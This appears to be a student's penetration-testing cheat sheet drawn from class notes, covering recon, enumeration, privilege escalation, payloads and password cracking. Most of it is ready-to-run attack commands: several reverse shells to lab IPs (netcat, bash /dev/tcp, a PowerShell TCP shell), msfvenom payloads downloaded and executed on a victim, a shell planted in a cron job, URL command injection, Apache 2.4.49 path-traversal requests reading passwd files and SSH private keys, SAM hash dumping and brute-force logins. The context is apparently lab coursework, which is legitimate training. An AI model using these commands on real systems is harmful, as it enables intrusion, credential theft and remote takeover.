# PTD-Cheatsheet
PTD Unit Cheat Sheet based on class notes

### Python One Liner
``` python3 -c 'import pty;pty.spawn("/bin/bash")' ```
### Searchsploit
```searchsploit -m path/./exploit.py```


## Recon

### Find name and IP
```sudo  nbtscan 192.168.x.x/24```
### Scan all ports that are open and services running
``` nmap -p- --open -sV -A 192.168.x.x ```
### WPscan
```
wpscan --url URL --plugins-detection aggressive -e vp
wpscan --url URL --plugins-detection aggressive -e ap

# Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
wpscan --url http://192.168.1.100/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```
### Script to get all ports in readable format
``` sudo nmap -p- --open -sV -A -T4 192.168.2.20 | grep "open" | awk '{print $1, $3}' > filtered_results.txt ```


## Enumerating

### Enum4Linux
``` enum4linux 192.168.x.x ```

### Log Files
```
#Look for cron jobs being recorded in log files.  A cron job may run a certain named file every 5 secondso or so.
#Log file may be output of pspy instance -> Use to find vulnerable folder or file

e.g 2019/09/10 15:25:02 ^[[31;1mCMD: UID=0    PID=796    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:25:02 ^[[31;1mCMD: UID=1000 PID=803    | /bin/sh -c /home/dawn/ITDEPT/product-control ^[[0m
2019/09/10 15:26:01 ^[[31;1mCMD: UID=0    PID=809    | /usr/sbin/CRON -f ^[[0m

In this example product control is a cron job, and is given permissions to run.
Lists the processes that are being launched in real time, including processes owned by root.
```

### Wordy websites
Scan for login details
``` wpscan --url http://wordy/ --enumerate p --enumerate t --enumerate u```
Save all account details in file and run
```wpscan --url //wordy/ -U users -P password```

### SMBClient
```
smbclient \\\\IP\\ -L -N
# If somehow the above command does not work (showing access denied)
smbclient \\\\IP\\ -L -N -I IP
# use the similar command option to login to the share
smbclient \\\\IP\\SHARE -N -I IP
# Login using null session
smbclient \\\\192.168.x.x\\SHARE_NAME -N

If you can enumerate share try cd ../
```
### smbmap
```
# domain is optional, may put -u '' -p '' to confirm null session access
smbmap -H IP -d DOMAIN -u domain_user -p pass -H IP
# depth probably > 5 if you wanna traverse and search deep into a share
smbmap -H IP -R SHARES -A PATTEN --depth 6 -q
```

### Nikto directory finder
``` nikto -h http://IP/```

### Check for SMB Vuln
``` nmap –script smb-vuln* -p 445 192.168.2.15```

### Check shellshock
```
nmap -sV -p80 –script http-shellshock
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
```
### DIRB
```
dirb http://IP/
Use -X .php OR .txt to filter files
```
### Mounting
```
sudo mount -t nfs 192.168.2.20:/tmp /mnt/nfs
go to /mnt/nfs
```
### VNC Viewer
```
vncviewer 192.168.2.20:5901
```
### HYDRA
```
hydra -P /usr/share/wordlists/rockyou.txt vnc://192.168.2.20:5901
```
### GoBuster
```
gobuster dir -u http://192.168.2.20 -w /usr/share/wordlists/dirb/big.txt -t 50
```
### GET DEFAULT credentials
```
Nmap -Pn -n –script http-default-accounts -p 80 192.168.2.20 –open -T5 -vv
```
### HTTP Vuln
```
nmap -Pn -n -p80 192.168.2.4 --script http-vuln* --open -T5 -vv
```
### Fuzzing
git clone https://github.com/danielmiessler/SecLists.git
apt -y install seclists
```
ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u http://192.168.56.125:8080/administration.php?FUZZ-helloworld -fs 65
ffuf -w ./SecLists/Discovery/Web-Content/common.txt -u 192.168.56.125:8080/administration.php?logfile=<name of file>
```





## Escalate Privileges

### Execute by adding /bin/bash
```
sudo -u user /bin/bash /var/www/html/start.sh
```
### Escalate by adding nc to cron job
```
echo "nc 192.168.2.x 4444 -e /bin/bash" >> /var/cron/check.sh
```


### Backup File
```Navigate to user directory and use ls -lah in backup files to find readable items
# Look for;
- processes run as root
- hashed passwords
- any processes that give you root access after running
```
### Find execute privileges for user currently logged in
``` sudo -l ```
### MySQL 
```
# Spawn a shell from \!sh mySql - sudo mysql -u root -p
# Check mysql history for login details - cat .mysql_history'

 ```
### Read Passwd file
``` cat /etc/passwd ```
``` If readable -> take password hash of the user: https://www.makeuseof.com/use-hashcat-to-crack-hashes-linux/```

### Upgrade meterpreter shell Windows
1. Create a windows TCP reverse shell payload executable
```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.49 LPORT=4446 -e x86/shikata_ga_nai -f exe -o reverse.exe```
OR
```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.2.5 LPORT=4444 -f exe > reverse.exe```

2. Host the payload on a server from our kali machine (in order to download it from the vul-
nerable machine)

```python -m http.server 8000 ```

3. Download the payload to the vulnerable machine using our powershell reverse shell use
format Invoke-WebRequest -Uri "http://192.168.56.49:8000/reverse.exe" -Outfile "reverse.exe"

```Invoke-WebRequest http://10.8.0.5:8000/reverse.exe -outfile .\reverse.exe```

-NOTE! may have to do this in public directory as its executable

5. Create another netcat listener on our kali machine
6. Execute the new reverse shell payload and capture the shell
./reverse.exe

### Reveal vulnerable services on Windows System
https://medium.com/@dasagreeva/windows-privilege-escalation-methods-2e93c954a287

1 Unquoted Service Paths
#``` wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ ```

Look for listed unquoted executable paths 

e.g. Vulnerable Service Vulnerable Service C:\Program Files (x86)\Program Folder\A Subfolder\Executable.exe Auto

If we drop malicious code to one of these paths, windows will run our exe as system upon restart of service

Check for permissions of folders
#```icacls “C:\Program Files (x86)\Program Folder”```    

#If (F = Full Control)  -> We can now place a payload into the folder and start of the service it will run as SYSTEM

Place payloads across windows folders
#```copy C:\Users\Public\reverse.exe ‘C:\Program Files (x86)\IObit\reverse.exe’```
#```Rename-Item reverse.exe Advanced.exe```

To restart and stop services USE
#```sc stop ServiceName```
#```sc start ServiceName```

2 Insecure File/Folder Permissions
   
Check permissions for vulnerable service executable path
#```icacls “C:\Program Files (x86)\Program Folder\A Subfolder”```
Replace executable.exe with a reverse shell payload and restarting the service

### Run NMAP as root permissions
``` echo "os.execute('/bin/sh')">/tmp/root.nse```
```sudo nmap --script=/tmp/root.nse```
 
### Export SAM and SYSTEM file to kali machine
```
impacket-smbserver share -smb2support -username USER -password PASS

#On windows use net use X: \\10.8.0.3\share /user:USER PASS
copy Backup\* X:\

Files should be on kali
dump stored hash from registry files

impacket-secretdump -sam SAM -system SYSTEM LOCAL

Put admin nthash in a file

Use hashcat to crack the hash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt

Use xfreedp or evil-winrm to gain access

evil-winrm -i 192.168.x.x -u Adminstrator -p PASS
```
Using Metasploit for above
After uploading into shares use msfconsole
```
use exploit/multi/handler
set payload generic/shell_reverse_tcp
set LHOST IP
set LPORT 4446
run
```
### Command line injection URL based
```
http://192.168.56.125:8080/administration.php?logfile=chat.txt;%20id
http://192.168.56.125:8080/administration.php?logfile=cat /etc/passwd
http://192.168.56.125:8080/administration.php?logfile=cd /home ls

http://192.168.56.125:8080/administration.php?logfile= chat.txt; nc IP PORT -e /bin/bash
```













## Payloads

#Payload Links
```https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config```

### Low Privilege Reverse Shell
```
#!/bin/bash
nc -e /bin/sh 192.168.x.x 4444
```
### Reverse Bash RAW for message redirecting
``` msfvenom -p cmd/unix/reverse_bash lhost=192.168.2.0 lport=4444 R ```

OUTPUT =  ```echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60"```

Redirect this to message service on vulnerable machine e.g: 

```echo "0<&60-;exec 60<>/dev/tcp/192.168.1.106/1234;sh <&60 >&60 2>&60" >> send_message_to_machine.sh```

### ExecStart exploit
``` ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'
# To file: echo "/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.124/4444 0>&1'" >> /tmp/wrapper.sh
```
### PHP Reverse Shell
https://github.com/pentestmonkey/php-reverse-shell

### Reverse powershell 
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
```
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```


## Password Cracking
https://www.tunnelsup.com/hash-analyzer/

### hashcat
```
#If md5 hash is found
hashcat -m 0 -a 0 md5.txt /usr/share/wordlists/rockyou.txt 
```
### John the ripper
```
john hash --wordlist=/user/share/wordlists/rockyou.txt --format=md5crypt
```
``` john hash --show```
Include full passwd file entry in hash

## Helpful tools

### Services
```
#Search Service contents
systemctl cat service.name.sh```
# List all services
systemctl list-unit-files –type=service
# Restart Service
sudo systemctl restart service_name.service
```
### Create password for passwd file
``` openssl passwd 123 ```
### Overwrite user service with payload
``` cp /tmp/exploit.sh /usr/local/bin/service.sh ```
### Decode hash base64
``` echo ' HASH '  | base64 -d ```
### See user sudo privileges
''' sudo -l ```


## General Commands

### SSH User Login
```ssh -i ssh_key.txt user@192.168.x.x```
### File permissions to run
```chmod 777 OR chmod 600```


## Exploits- Specific Scenarios

### Web Applications
- Remember to check service version and use https://www.exploit-db.com/ to find vulnerabilities
-  Version is usually found using the -sV flag on nmap or IF it has a webpage hosting a CMS, check the webpage for the version running.

### Reveal contents of a file Apache HTTP Server 2.4.49 Exploit- Path Traversal and Remote Code Execution
```
# Reveal passwd file
curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
# Reveal private SSH keys for any users found
curl -s --path-as-is -d "echo Content-Type: text/plain;" "192.168.56.125/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/home/treehouse/.ssh/id_rsa"
```
### File Capabilities
```
File capabilities are certain permissions you can give to binaries.
Instead of giving a binary ‘sudo’ permission, you can give the binary certain elevated permissions. This is considered
a safer practise than giving the binary full permissions, as sometimes a binary only needs elevated permissions for a few selected functions.
https://manpages.ubuntu.com/manpages/lunar/en/man7/capabilities.7.html

# List all file capabilities
getcap -r / 2>/dev/null

# RSYNC
rsync is a utility for efficiently transferring and synchronizing files between a computer and a storage drive and across networked computers.
# Copy files using rsync
rsync /etc/passwd /home/destination/
rsync passwd /etc/passwd
```

### CMS Made Simple 2.2.5 Authenticated Remote Code Execution
```
#Enumerate the directories
dirb http://192.168.56.126/   -> make sure to include the directed page e.g /cmsms/ as URL
Visit and follow
https://www.exploit-db.com/exploits/44976
- NOTE! When uploading file to CMS copy to .php file type in the upload folder
```

### IIS FTP file upload exploit
```
https://infinitelogins.com/2020/01/20/hack-the-box-write-up-devel-without-metasploit/
```




